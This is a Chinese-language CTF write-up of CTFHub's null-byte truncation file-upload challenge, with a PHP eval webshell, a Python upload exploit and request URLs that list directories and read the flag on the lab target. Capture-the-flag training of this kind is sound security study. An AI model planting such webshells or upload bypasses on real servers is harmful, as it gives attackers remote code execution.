# CTFHub 文件上传 - 00截断
## 一、题目信息
平台：CTFHub
分类：Web - 文件上传
题目名称：00截断
难度：简单
Flag：`ctfhub{f2eef061085c1c43c41a0742}`

## 二、考点
1. PHP空字节（0x00 / %00）截断原理：字符串遇到0x00视为结束，丢弃后面字符
2. GET参数可控，自定义文件保存路径，配合`move_uploaded_file`实现路径截断
3. 文件上传白名单校验，仅校验上传文件后缀 jpg/png/gif
4. PHP版本限制：00截断仅在PHP<5.3.29，`magic_quotes_gpc`关闭时生效
5. PHP一句话木马基础利用，`highlight_file`读取服务器文件源码获取flag

## 三、题目内容
页面提供文件上传表单，后端设置后缀白名单，仅允许上传jpg、png、gif格式文件。
文件保存路径由GET参数`road`可控拼接，旧版本PHP中`move_uploaded_file`存在空字节截断漏洞，在路径后添加0x00空字节，可以截断字符串，丢弃空字节后的后缀内容，将图片马保存为PHP文件，实现代码执行。
后端逻辑：获取上传文件后缀，判断是否在jpg/png/gif白名单内；如果校验通过，使用GET传入的road参数拼接文件保存路径，再移动上传文件到目标路径。

## 四、解题步骤
1. 编写PHP一句话木马：`<?php @eval($_GET['cmd']);?>`，保存文件命名为`shell.jpg`，后缀jpg，通过白名单检测。
2. 使用Python构造上传请求，GET参数`road`设置为`/var/www/html/upload/shell.php\x00`，末尾带上`\x00`空字节。
3. 运行脚本，文件上传成功，利用00截断，最终文件保存路径为`upload/shell.php`。
4. 访问木马地址，传入cmd参数，使用`scandir`列出网站目录：
`http://靶场地址/upload/shell.php?cmd=print_r(scandir('/var/www/html'));`
5. 找到flag文件后，使用`highlight_file`读取flag源码，构造Payload：
`http://靶场地址/upload/shell.php?cmd=highlight_file('/var/www/html/flag.php');`
访问链接，查看网页源代码，提取得到flag。

## 五、Python EXP
{% highlight python %}
import requests

target = "http://challenge-url.sandbox.ctfhub.com:10800/index.php"
road_path = "/var/www/html/upload/shell.php\x00"
params = {"road": road_path}

files = {
    "file": ("shell.jpg", b"<?php @eval($_GET['cmd']);?>", "image/jpeg")
}
data = {"submit":"Submit"}

res = requests.post(target, params=params, files=files, data=data)
print(res.text)
{% endhighlight %}

## 六、知识点解析
1. 00截断限制条件：PHP版本小于5.3.29，并且`magic_quotes_gpc`关闭。PHP5.3.29及之后修复了该空字节截断漏洞。
2. 直接在浏览器地址栏输入`%00`会被浏览器提前解码，无法触发截断，必须在原始HTTP请求数据包内传入0x00字节。
3. 本题后端仅校验**上传文件的后缀名**，不校验写入服务器的最终文件名，所以jpg图片马可以通过白名单检测。
4. `move_uploaded_file`是PHP文件移动函数，在满足条件的旧版本PHP下，读取路径字符串遇到`0x00`就终止读取。
5. `highlight_file()`：PHP内置函数，读取文件并高亮输出源码，适合读取php格式的flag文件。

## 七、总结
本题是经典GET型路径00截断文件上传漏洞。核心思路是利用可控的保存路径参数，插入空字节截断字符串，修改文件最终保存名称，将图片马写入php文件，获取代码执行权限读取服务器内flag文件。
防御层面，不能信任用户可控的路径参数，应当对路径做严格过滤，禁止空字节等特殊字符。
